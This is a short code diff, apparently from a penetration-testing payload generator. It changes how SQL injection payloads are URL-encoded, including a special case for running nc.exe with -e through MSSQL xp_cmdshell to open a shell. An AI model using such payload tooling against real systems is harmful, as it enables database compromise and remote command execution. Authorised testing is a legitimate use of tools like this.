@@ -237,8 +237,9 @@ const EXEC_CORE: Record<Exec, (c: Ctx) => Core> = {
   },
 };
 
-function finalize(raw: string, point: SqlPoint): string {
-  return point === "url-param" ? urlEncodeShell(raw) : raw;
+/** URL-encodes for url-param; the unresolved placeholders stay readable, any other {…} (a custom cmd's ${IFS}) is encoded. */
+function finalize(raw: string, point: SqlPoint, unresolved: string[]): string {
+  return point === "url-param" ? urlEncodeShell(raw, unresolved) : raw;
 }
 
 export function buildSql(stepOrExecId: string, engine: SqlEngine, point: SqlPoint, values: SqlValues = {}): BuiltPayload {
@@ -281,7 +282,7 @@ export function buildSql(stepOrExecId: string, engine: SqlEngine, point: SqlPoin
   if (session) notes.push("Plain statement for impacket-mssqlclient, mysql or psql: no quote break, no trailing comment, no encoding.");
   if (exec) notes.push(`Needs: ${exec.explain}`);
 
-  let text = finalize(raw, point);
+  let text = finalize(raw, point, c.unresolved);
   // R3: the nc.exe -e flag needed %2d through xp_cmdshell in a URL; nothing else gets it.
   if (point === "url-param" && exec?.id === "mssql-xp_cmdshell" && values.shell === "nc-exe" && !values.cmd) text = text.replace("+-e+", "+%2de+");
 
